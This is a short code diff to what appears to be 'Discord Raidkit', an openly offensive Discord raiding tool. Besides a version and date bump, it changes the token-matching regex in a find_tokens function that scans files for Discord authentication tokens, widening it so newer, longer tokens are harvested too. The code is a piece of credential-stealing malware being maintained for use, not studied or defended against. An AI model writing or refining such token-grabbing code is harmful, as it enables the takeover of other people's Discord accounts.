@@ -1,8 +1,8 @@
 """
-Discord Raidkit v2.4.4
+Discord Raidkit v2.4.5
 the-cult-of-integral
 
-Last modified: 2023-10-28 17:35
+Last modified: 2024-04-07 05:17
 """
 
 import asyncio
@@ -680,7 +680,7 @@ def find_tokens(path) -> list:
             continue
     
         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27,40}', r'mfa\.[\w-]{84}'):
                 for token in re.findall(regex, line):
                     tokens.append(token)
     
